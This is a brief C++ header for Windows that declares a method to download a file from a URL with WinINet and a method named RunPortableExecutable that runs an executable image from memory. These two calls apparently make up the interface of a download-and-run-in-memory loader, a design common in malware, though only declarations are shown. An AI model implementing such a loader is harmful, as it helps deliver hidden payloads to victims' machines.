#include <Windows.h>
#include <Wininet.h>

#pragma comment(lib,"wininet.lib")
class System
{
public:
	int RunPortableExecutable(void* Image);
};

class Internet
{
public:
	char* GetFile(const char* szUrl);
};

